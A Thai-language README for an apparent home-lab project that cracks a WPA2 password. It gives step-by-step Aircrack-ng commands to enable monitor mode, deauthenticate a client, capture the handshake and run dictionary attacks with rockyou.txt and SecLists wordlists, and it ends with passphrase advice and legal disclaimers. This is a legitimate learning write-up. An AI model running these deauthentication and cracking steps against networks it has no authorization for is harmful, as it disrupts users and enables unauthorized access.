# WiFi Security Auditing Project (การแครกแฮนด์เชค WPA2)

> ⚠️ **คำเตือน**: โปรเจกต์นี้ทำบนเครือข่าย WiFi และอุปกรณ์ส่วนตัวของผมเองเท่านั้น ในสภาพแวดล้อม home lab ที่ควบคุมได้ เพื่อการศึกษาเท่านั้น ไม่มีการเข้าถึงเครือข่ายของบุคคลที่สาม การเข้าถึงเครือข่ายที่ไม่ใช่ของตัวเองโดยไม่ได้รับอนุญาตถือเป็นสิ่งผิดกฎหมาย — ต้องขออนุญาตเป็นลายลักษณ์อักษรก่อนทดสอบเครือข่ายที่ไม่ได้เป็นเจ้าของเองเสมอ

## ภาพรวม

**กรกฎาคม 2026**

โปรเจกต์ penetration testing แบบลงมือทำจริง เพื่อประเมินความปลอดภัยของเครือข่าย WiFi ที่ใช้ WPA2 ส่วนตัว ด้วยการจับ WPA handshake แล้วพยายามถอดรหัสผ่านด้วย dictionary attack

- เปิด monitor mode บนอะแดปเตอร์ไร้สาย แล้วสำรวจหา access point ใกล้เคียง
- จับ WPA2 4-way handshake จาก access point ของตัวเอง
- ยิง deauthentication แบบเจาะจงเป้าหมาย เพื่อบังคับให้เกิดการ re-capture handshake
- แครก handshake ที่จับได้แบบ offline ด้วย `aircrack-ng` เทียบกับหลาย wordlist
- สรุปผลและข้อเสนอแนะด้านสุขอนามัยของรหัสผ่าน

## เครื่องมือและเทคโนโลยี

- Kali Linux
- ชุดเครื่องมือ Aircrack-ng (`airmon-ng`, `airodump-ng`, `aireplay-ng`, `aircrack-ng`)
- อะแดปเตอร์ WiFi ที่รองรับ monitor mode / packet injection (COMFAST CF-922AC, ชิปเซ็ต MT7612U)
- Wordlist `rockyou.txt` และ SecLists หมวด `WiFi-WPA`

## ทักษะหลัก

- การสำรวจเครือข่ายไร้สาย (reconnaissance)
- การจับ WPA/WPA2 handshake
- การโจมตีแบบ deauthentication
- การแครกรหัสผ่านด้วย dictionary attack
- คำแนะนำการเสริมความปลอดภัยเครือข่ายไร้สาย

---

## ขั้นตอนการทำงาน

### 1. เช็คสถานะอะแดปเตอร์ก่อนเริ่ม

เช็คชื่อ interface ปัจจุบันของอะแดปเตอร์ และยืนยันว่ายังอยู่โหมดปกติ (Managed)

```bash
iwconfig
```

มองหา interface ที่ไม่ใช่ `lo` และไม่ใช่ตัวที่ใช้ต่อเน็ตหลักอยู่ (เช่น `wlan0`) — ตัวที่เหลือคืออะแดปเตอร์ที่จะเอาไปเปิด monitor mode (เช่น `wlan1`)

### 2. ฆ่า process ที่จะมาแย่ง interface ระหว่างเปิด monitor mode

```bash
sudo airmon-ng check kill
```

NetworkManager / wpa_supplicant อาจแย่งคุม interface ระหว่างสลับโหมดได้ ต้องเคลียร์ก่อน (เน็ตหลักจะหลุดชั่วคราว ปกติ)

> 💡 **ต่อเน็ตกลับ:** คำสั่งข้างบนตัดการเชื่อมต่อเน็ตหลักชั่วคราว ถ้าต้องการต่อเน็ตกลับระหว่างทำ (หรือหลังทำเสร็จ) รัน:
> ```bash
> sudo systemctl restart NetworkManager
> ```

### 3. เปิด monitor mode

```bash
sudo airmon-ng start wlan1
```

### 4. ยืนยันว่าเปิด monitor mode ติดจริง

```bash
iwconfig
```

ของที่ต้องเห็น:
- ชื่อ interface เปลี่ยนเป็น `wlan1mon` (มี "mon" ต่อท้าย)
- บรรทัดโหมดขึ้นเป็น `Mode:Monitor` แทนที่จะเป็น `Mode:Managed`

ถ้ายังเห็น `wlan0`/`Mode:Managed` แปลว่ายังไม่ติด ย้อนกลับไปข้อ 3

### 5. สแกนหา AP เป้าหมาย

```bash
sudo airodump-ng wlan1mon --band a
```

`--band a` คือสแกนคลื่น 5GHz (ใช้ถ้า SSID เป้าหมายลงท้าย `_5G`) ถ้าเป็น 2.4GHz ให้ตัดแฟล็กนี้ออก หรือใช้ `--band abg` เพื่อสแกนทุกคลื่น

จดสามอย่างจากแถวของเป้าหมาย: **BSSID**, **CH** (channel), **ESSID** พอได้ครบแล้วกด `Ctrl+C`

### 6. ล็อกเป้าหมายและเริ่มจับแพ็กเก็ต

```bash
sudo airodump-ng -c <channel> --bssid <BSSID เป้าหมาย> -w capture wlan1mon
```

ปล่อยหน้าต่างนี้ค้างไว้ **ห้ามปิด** มันจะดักฟังและบันทึกทุกแพ็กเก็ตที่เกี่ยวกับ AP นี้ลงไฟล์ `capture-01.cap` ตาราง STATION ด้านล่างจะโชว์ client ที่ต่ออยู่ (ต้องใช้ MAC จากตรงนี้ในข้อ 7)

### 7. ยิง deauth บังคับ reconnect (เปิดหน้าต่างใหม่)

```bash
sudo aireplay-ng -0 2 -a <BSSID เป้าหมาย> -c <client MAC> wlan1mon
```

- `-a <BSSID เป้าหมาย>` — MAC address ของ AP
- `-c <client MAC>` — client ที่จะเตะออก (เลือกตัวที่ PWR แรงสุดในตาราง STATION เพราะสัญญาณใกล้กว่า จับ handshake ง่ายกว่า)

ต้องใส่ค่าให้ครบทั้ง `-a` และ `-c` ไม่งั้นจะเจอ error `Invalid AP MAC address`

### 8. ยืนยันว่าจับ handshake ได้จริง

กลับไปดูหน้าต่าง `airodump-ng` จากข้อ 6 มุมขวาบนควรขึ้น

```
WPA handshake: <BSSID>
```

และตาราง STATION ต้องมีคอลัมน์ `EAPOL` ขึ้นด้วย พอเห็นครบสองอย่างนี้แล้วค่อยกด `Ctrl+C` หยุด capture

### 9. เช็คว่า wordlist พร้อมใช้ไหม

Kali มักเก็บ `rockyou.txt` เป็นไฟล์บีบอัด ต้องแตกก่อนใช้ครั้งแรก

```bash
ls -lh /usr/share/wordlists/rockyou.txt*
```

ถ้าเห็นแค่ไฟล์ `.gz` ให้แตกก่อน:

```bash
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```

### 10. เช็คว่ารหัสผ่านที่คาดไว้มีอยู่ใน rockyou.txt ไหม (grep)

```bash
grep -c "^<รหัสผ่านที่คาดว่าใช่>$" /usr/share/wordlists/rockyou.txt
```

ผลลัพธ์ `1` ขึ้นไป = มีคำนั้นอยู่ในลิสต์ `0` = ไม่มี ต้องลองลิสต์อื่น (ดูข้อ 12)

### 11. แครก handshake (dictionary attack แบบมาตรฐาน)

```bash
aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt
```

ถ้าเจอ error `ESSID is required` (เพราะไม่มี beacon frame ติดมาในไฟล์ capture) ให้เติม `-e <ชื่อ WiFi>` ต่อท้ายคำสั่ง

### 12. ลอง wordlist ที่เจาะจงกว่า (SecLists WiFi-WPA)

```bash
sudo apt install seclists
ls /usr/share/seclists/Passwords/WiFi-WPA/
```

เทียบขนาดได้ถ้าอยากรู้:

```bash
wc -l /usr/share/wordlists/rockyou.txt
wc -l /usr/share/seclists/Passwords/WiFi-WPA/*.txt
```

แครกด้วยไฟล์นี้ตรงๆ — แค่เปลี่ยน path ของ `-w`:

```bash
aircrack-ng capture-01.cap -w /usr/share/seclists/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt
```

---

## การแก้ไขปัญหา (Remediation)

หลังจากถอดรหัสผ่านได้ (หรือยืนยันว่ารหัสเดิมแข็งแรงพอ) ให้ทบทวนความแข็งแรงของรหัสผ่าน แล้วเปลี่ยนเป็น passphrase ที่ยาวขึ้นและไม่ใช่คำใน dictionary (WPA2/WPA3) แนะนำ 15 ตัวอักษรขึ้นไปแบบสุ่ม หรือ passphrase แบบสุ่มที่ยาวพอ

## หมายเหตุ

โปรเจกต์นี้มีไว้เพื่อเรียนรู้แนวคิดด้านความปลอดภัยเครือข่ายไร้สาย ทดสอบเฉพาะเครือข่ายและอุปกรณ์ที่เป็นเจ้าของเอง หรือได้รับอนุญาตอย่างชัดเจนเท่านั้น
